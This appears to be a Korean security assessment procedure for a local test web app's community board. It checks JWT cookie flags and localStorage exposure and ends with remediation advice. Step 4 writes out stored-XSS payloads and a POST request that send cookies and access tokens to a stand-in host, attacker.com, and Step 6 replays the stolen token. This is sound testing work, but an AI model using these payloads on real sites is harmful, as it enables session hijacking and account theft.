================================================================================
[VCE-CM-15] 쿠키 및 웹스토리지 조작 가능성 (커뮤니티)
도메인: community
================================================================================

1. 진단 항목 개요
   - 항목명: JWT 쿠키 보안 속성 미설정 + localStorage XSS 탈취 가능
   - 번호: CM-15
   - 위험도: High
   - OWASP: A02:2021 – Cryptographic Failures

2. 대상 기능 & 엔드포인트
   - 로컬:  http://localhost:5173 (Exchange Frontend) / http://localhost:5174 (Bank)
   - 쿠키:  vce_token (JWT 저장 쿠키 또는 localStorage)
   - HTTP 메서드: GET (쿠키/스토리지 분석)
   - 인증 요건: 없음 (브라우저 DevTools로 확인)

3. 취약점 원리 (Why this works)
   JWT가 쿠키에 저장될 경우:
   - HttpOnly 없음 → JavaScript로 document.cookie 읽기 가능 → XSS로 탈취
   - Secure 없음 → HTTP 전송 가능 → 네트워크 스니핑으로 탈취
   - SameSite 없음/Lax → CSRF 공격 가능

   JWT가 localStorage에 저장될 경우:
   - XSS 공격으로 localStorage.getItem('token') 읽기 가능
   - CommunityDetail.tsx:323의 Stored XSS와 연계하면 즉시 탈취 가능

   Stored XSS(게시글) → 쿠키/스토리지 탈취 → 계정 탈취의 연쇄 공격.

4. 테스트 절차 (Step-by-step)

   Step 1. 로그인 후 쿠키 확인
   브라우저 DevTools → Application → Cookies → localhost:5173

   확인 항목:
   vce_token 쿠키의:
   - HttpOnly: ✗ (없으면 JS로 읽기 가능)
   - Secure: ✗ (없으면 HTTP 전송)
   - SameSite: ✗ / Lax / Strict
   - Expires: 만료 시간 확인

   Step 2. JavaScript로 쿠키 읽기 (브라우저 콘솔)
   document.cookie
   → vce_token=eyJhbGci... 가 출력되면 HttpOnly 미설정 → XSS로 탈취 가능

   Step 3. localStorage 확인
   localStorage.getItem('token')
   localStorage.getItem('jwt')
   localStorage.getItem('accessToken')
   → JWT가 localStorage에 저장되어 있으면 XSS로 즉시 탈취 가능

   Step 4. Stored XSS와 연계한 토큰 탈취
   게시글 content에 삽입할 XSS 페이로드:

   쿠키 탈취 (HttpOnly 없음):
   <script>fetch('https://attacker.com?c='+encodeURIComponent(document.cookie))</script>

   localStorage 탈취:
   <script>fetch('https://attacker.com?t='+localStorage.getItem('accessToken'))</script>

   --- HTTP 요청 예시 (게시글 작성) ---
   POST /api/community/posts HTTP/1.1
   Host: localhost:8080
   Authorization: Bearer <JWT>
   Content-Type: application/json

   {
     "title": "중요 공지",
     "content": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
   }
   ---

   Step 5. 쿠키 직접 수정 시도 (DevTools)
   Application → Cookies → vce_token 값 수정
   → 위조된 JWT로 교체하면 다른 사용자로 인식되는지 확인

   Step 6. XSS 페이로드로 세션 하이재킹
   탈취한 JWT로 API 요청:
   --- HTTP 요청 예시 ---
   GET /api/auth/me HTTP/1.1
   Host: localhost:8080
   Authorization: Bearer <탈취한_JWT>
   ---

5. 취약 여부 판단 기준
   ✅ 취약 (Vulnerable):
      - document.cookie에 JWT 포함 → HttpOnly 미설정
      - localStorage에 JWT 저장됨 → XSS로 탈취 가능
      - Secure 속성 없음 → HTTP로 쿠키 전송
      - SameSite 없음 → CSRF 가능
   ✗ 안전 (Not Vulnerable):
      - HttpOnly: true → document.cookie에서 JWT 안 보임
      - Secure: true → HTTPS에서만 전송
      - SameSite: Strict → 교차 사이트 요청에 쿠키 포함 안 됨

6. 예상 취약 포인트 (코드 위치)
   - OAuth2SuccessHandler.java — JWT를 쿠키에 저장 시 보안 속성 미설정
   - CommunityDetail.tsx:323 — dangerouslySetInnerHTML → Stored XSS 연계
   - 프론트엔드 — localStorage에 JWT 저장

7. 권고 조치
   - 쿠키 보안 속성 설정: HttpOnly=true; Secure=true; SameSite=Strict
   - localStorage 대신 HttpOnly 쿠키에 JWT 저장
   - CommunityDetail.tsx: dangerouslySetInnerHTML → DOMPurify sanitize 적용
   - CSP 헤더: script-src 'self' 로 외부 스크립트 차단
